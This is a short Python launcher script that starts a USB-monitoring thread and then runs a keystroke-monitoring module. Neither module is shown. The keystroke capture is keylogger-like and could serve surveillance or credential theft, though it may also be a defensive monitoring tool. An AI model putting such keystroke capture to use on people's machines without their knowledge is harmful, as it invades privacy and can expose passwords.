from usb_monitory import monitor_usb
import keystroke_monitor
from threading import Thread


print("Starting USB monitor... ")

usb_thread = Thread(target=monitor_usb,daemon=False)
usb_thread.start()

keystroke_monitor.main()